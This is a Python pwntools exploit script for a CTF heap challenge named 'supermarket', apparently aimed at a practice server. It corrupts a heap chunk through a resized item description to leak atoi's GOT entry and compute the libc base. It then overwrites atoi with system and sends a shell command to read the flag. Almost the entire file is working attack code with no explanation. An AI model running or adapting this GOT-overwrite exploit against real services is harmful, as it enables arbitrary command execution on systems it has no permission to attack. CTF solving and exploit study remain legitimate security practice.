from pwn import *
from LibcSearcher import *
import sys
# context.log_level = 'debug'
if len(sys.argv) == 1 or sys.argv[1] == 'l':
    p = process('./supermarket')
    elf = ELF('./supermarket')
    libc = ELF('/home/cutecabbage/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')
else:
    p = remote('61.147.171.105', 61526)
    elf = ELF('./supermarket')
    libc = ELF('./libc.so.6')
    pause()
# libc=ELF('/home/cutecabbage/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so')

one_gadget=0x5faa5

def add(name,price,descsize,desc):
    p.recvuntil(b'choice>> ')
    p.sendline(b'1')
    p.recvuntil(b'name:')
    p.sendline(name)
    p.recvuntil(b'price:')
    p.sendline(str(price).encode())
    p.recvuntil(b'descrip_size:')
    p.sendline(str(descsize).encode())
    p.recvuntil(b'description:')
    p.sendline(desc)
def delete(name):
    p.recvuntil(b'choice>> ')
    p.sendline(b'2')
    p.recvuntil(b'name:')
    p.sendline(name)
def listgoods():
    p.recvuntil(b'choice>> ')
    p.sendline(b'3')
def changeprice(name,price):
    p.recvuntil(b'choice>> ')
    p.sendline(b'4')
    p.recvuntil(b'name:')
    p.sendline(name)
    p.recvuntil(b'in:')
    p.sendline(str(price).encode())
def changedesc(name,descsize,desc):
    p.recvuntil(b'choice>> ')
    p.sendline(b'5')
    p.recvuntil(b'name:')
    p.sendline(name)
    p.recvuntil(b'size:')
    p.sendline(str(descsize).encode())
    p.recvuntil(b'description:')
    p.sendline(desc)

add(b'aaaa',16,0xc0,b'bbbb')
add(b'gggg',16,0x10,b'zzzz')
changedesc(b'aaaa',0xf0,b'')
pause()
add(b'dddd',16,0x20,b'eeee')
payload=b'dddd'+p32(0)*3+p32(0x10)+p32(0x20)+p32(elf.got['atoi'])+p32(0x21)
changedesc(b'aaaa',0xc0,payload)
listgoods()
context.log_level = 'debug'
p.recvuntil(b'dddd: price.')
p.recvuntil(b'des.')
atoi_addr=u32(p.recv(4))
print(hex(atoi_addr))
libc_base=atoi_addr-libc.symbols['atoi']
system_addr=libc_base+libc.symbols['system']
# system_addr=libc_base+one_gadget
print(hex(libc_base))
changedesc(b'dddd',0x20,p32(system_addr))
# p.sendlineafter(b'choice>> ',b'/bin/sh\x00')
p.sendlineafter(b'choice>> ',b'base64<flag\x00')
p.interactive()
